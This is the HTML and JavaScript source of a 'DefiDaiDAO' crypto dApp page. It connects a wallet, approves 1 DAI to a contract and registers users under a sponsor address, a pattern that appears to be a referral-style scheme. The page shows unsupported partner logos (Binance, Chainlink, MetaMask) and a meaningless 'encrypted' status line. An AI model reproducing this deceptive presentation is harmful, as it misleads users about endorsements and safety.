<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DefiDaiDAO | Secure Ecosystem</title>
    <style>
        :root {
            --binance-yellow: #F3BA2F;
            --bg-dark: #0B0E11;
            --card-bg: #1E2329;
            --text-main: #EAECEF;
            --text-dim: #848E9C;
            --border: #474D57;
        }

        body, html { margin: 0; padding: 0; background: var(--bg-dark); color: var(--text-main); font-family: 'Inter', sans-serif; overflow-x: hidden; }
        #bg-canvas { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 0; pointer-events: none; }

        .container {
            position: relative; z-index: 10; display: flex; flex-direction: column; align-items: center; justify-content: center;
            min-height: 100vh; padding: 20px;
        }

        .card {
            background: var(--card-bg); border-radius: 32px; width: 100%; max-width: 440px; padding: 2.5rem;
            box-shadow: 0 40px 100px rgba(0,0,0,0.8); border: 1px solid var(--border); backdrop-filter: blur(10px);
        }

        h1 { color: var(--binance-yellow); font-size: 2.8rem; font-weight: 900; margin: 0; text-align: center; letter-spacing: -1px; }
        .subtitle { font-size: 0.9rem; color: var(--text-dim); text-align: center; margin-bottom: 30px; }

        .balance-box { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-bottom: 25px; }
        .bal-item { background: rgba(0,0,0,0.3); padding: 12px; border-radius: 16px; border: 1px solid #2B3139; text-align: center; }
        .bal-v { font-size: 1rem; font-weight: bold; color: #fff; display: block; }
        .bal-lbl { font-size: 0.55rem; color: var(--text-dim); }

        .btn { width: 100%; border-radius: 18px; border: none; font-weight: 800; cursor: pointer; transition: 0.3s; display: flex; justify-content: center; align-items: center; text-transform: uppercase; }
        .btn-main { background: var(--binance-yellow); color: #000; padding: 20px; font-size: 1.2rem; margin-bottom: 20px; box-shadow: 0 0 20px rgba(243, 186, 47, 0.3); }

        /* NEON SPONSOR BOX */
        .reg-zone { display: none; margin-top: 10px; border-top: 1px solid #2B3139; padding-top: 25px; }
        .input-box { 
            background: rgba(243, 186, 47, 0.05); border: 2.5px solid var(--binance-yellow); 
            border-radius: 15px; padding: 22px; margin-bottom: 20px;
            box-shadow: 0 0 25px rgba(243, 186, 47, 0.2);
            animation: pulse-glow 1.5s infinite;
        }
        @keyframes pulse-glow { 0% { opacity: 0.8; } 50% { opacity: 1; box-shadow: 0 0 35px rgba(243, 186, 47, 0.4); } 100% { opacity: 0.8; } }
        input { background: transparent; border: none; color: #fff; width: 100%; outline: none; font-size: 0.85rem; text-align: center; font-family: monospace; font-weight: bold; }

        /* PARTNERS SECTION - ALL LOGOS INCLUDED */
        .partners { margin-top: 40px; display: flex; gap: 18px; justify-content: center; align-items: flex-start; flex-wrap: wrap; padding: 20px; border-top: 1px solid rgba(255,255,255,0.05); }
        .partner-link { text-decoration: none; color: var(--text-dim); display: flex; flex-direction: column; align-items: center; gap: 8px; width: 65px; }
        .partner-logo { width: 30px; height: 30px; object-fit: contain; filter: drop-shadow(0 0 5px rgba(255,255,255,0.1)); }
        .partner-link span { font-size: 0.5rem; text-align: center; font-weight: 700; text-transform: uppercase; }

        #status { font-size: 0.65rem; color: var(--text-dim); margin-top: 25px; text-align: center; }
    </style>
</head>
<body>

<canvas id="bg-canvas"></canvas>

<div class="container">
    <div class="card">
        <h1>DefiDaiDAO</h1>
        <div class="subtitle">DeFi secure ecosystem</div>

        <div class="balance-box">
            <div class="bal-item"><span class="bal-v" id="bnbVal">0.000</span><span class="bal-lbl">BNB BALANCE</span></div>
            <div class="bal-item"><span class="bal-v" id="daiVal">0.00</span><span class="bal-lbl">DAI BALANCE</span></div>
        </div>

        <button id="connectBtn" class="btn btn-main">Connect Wallet</button>

        <div id="registrationZone" class="reg-zone">
            <div id="step1">
                <button id="approveBtn" class="btn btn-main">1. Approve DAI</button>
            </div>
            <div id="step2" style="display:none;">
                <div class="input-box">
                    <input type="text" id="uplineInput" placeholder="ENTER SPONSOR ADDRESS">
                </div>
                <button id="registerBtn" class="btn btn-main">2. Finalize Registration</button>
            </div>
        </div>
        <div id="status">ENCRYPTED NODE CONNECTION</div>
    </div>

    <div class="partners">
        <a href="#" class="partner-link">
            <img src="https://cryptologos.cc/logos/binance-coin-bnb-logo.png" class="partner-logo">
            <span>Binance</span>
        </a>
        <a href="#" class="partner-link">
            <img src="https://cryptologos.cc/logos/bnb-bnb-logo.png" class="partner-logo" style="filter: brightness(1.5);">
            <span>BscScan</span>
        </a>
        <a href="#" class="partner-link">
            <img src="https://cryptologos.cc/logos/chainlink-link-logo.png" class="partner-logo">
            <span>Chainlink</span>
        </a>
        <a href="#" class="partner-link">
            <img src="https://cryptologos.cc/logos/pancakeswap-cake-logo.png" class="partner-logo">
            <span>Pancake</span>
        </a>
        <a href="#" class="partner-link">
            <img src="https://cryptologos.cc/logos/trust-wallet-token-twt-logo.png" class="partner-logo">
            <span>Trust</span>
        </a>
        <a href="#" class="partner-link">
            <img src="https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" class="partner-logo">
            <span>MetaMask</span>
        </a>
        <a href="#" class="partner-link">
            <img src="https://altcoinsbox.com/wp-content/uploads/2023/04/walletconnect-logo.png" class="partner-logo">
            <span>Connect</span>
        </a>
    </div>
</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/6.7.0/ethers.umd.min.js"></script>
<script>
    // --- VIVID GOLDEN PARTICLES ---
    const canvas = document.getElementById('bg-canvas');
    const ctx = canvas.getContext('2d');
    let particles = [];
    function initParticles() {
        canvas.width = window.innerWidth; canvas.height = window.innerHeight;
        particles = [];
        for(let i=0; i<120; i++) {
            particles.push({ 
                x: Math.random()*canvas.width, y: Math.random()*canvas.height, 
                r: Math.random()*4 + 1.5, d: Math.random()*0.4 + 0.1, o: Math.random()*0.7 + 0.3 
            });
        }
    }
    function drawParticles() {
        ctx.clearRect(0,0,canvas.width, canvas.height);
        particles.forEach(p => {
            ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2);
            ctx.fillStyle = `rgba(243, 186, 47, ${p.o})`; ctx.fill();
            p.y -= p.d; if(p.y < -10) p.y = canvas.height + 10;
        });
        requestAnimationFrame(drawParticles);
    }
    initParticles(); drawParticles();

    // --- LOGIC ---
    const BSC_HEX = "0x38";
    const CONTRACT_ADDRESS = "0x84a47446f7a563Ce899aE991127b20FB8E20cEca";
    const DAI_ADDRESS = "0x1AF3F329e8BE154074D8769D1FFa4eE058B1DBc3";
    let signer, mainContract, tokenContract;

    document.getElementById('connectBtn').onclick = async () => {
        if(!window.ethereum) return alert("Wallet not found");
        try {
            const provider = new ethers.BrowserProvider(window.ethereum);
            await provider.send("eth_requestAccounts", []);
            signer = await provider.getSigner();
            const addr = await signer.getAddress();
            
            tokenContract = new ethers.Contract(DAI_ADDRESS, ["function approve(address s, uint256 a) public returns (bool)", "function balanceOf(address) view returns (uint256)"], signer);
            mainContract = new ethers.Contract(CONTRACT_ADDRESS, ["function step_2_become_owner(address _target) external", "function Owner_Info_Global(address _u) external view returns (uint64 ID)"], signer);

            const info = await mainContract.Owner_Info_Global(addr);
            document.getElementById('connectBtn').innerText = "CONNECTED: " + addr.substring(0,6) + "...";
            if(Number(info.ID) === 0) document.getElementById('registrationZone').style.display = "block";
            
            const bnb = await provider.getBalance(addr);
            document.getElementById('bnbVal').innerText = parseFloat(ethers.formatEther(bnb)).toFixed(3);
            const dai = await tokenContract.balanceOf(addr);
            document.getElementById('daiBal').innerText = parseFloat(ethers.formatUnits(dai, 18)).toFixed(2);
        } catch (e) { console.error(e); }
    };

    document.getElementById('approveBtn').onclick = async () => {
        try {
            const tx = await tokenContract.approve(CONTRACT_ADDRESS, ethers.parseUnits("1", 18));
            await tx.wait();
            document.getElementById('step1').style.display = "none";
            document.getElementById('step2').style.display = "block";
        } catch (e) {}
    };

    document.getElementById('registerBtn').onclick = async () => {
        const up = document.getElementById('uplineInput').value.trim();
        if(!ethers.isAddress(up)) return alert("Invalid Address");
        try {
            const tx = await mainContract.step_2_become_owner(up);
            await tx.wait();
            alert("Registration Complete!");
            location.reload();
        } catch (e) {}
    };
</script>
</body>
</html>
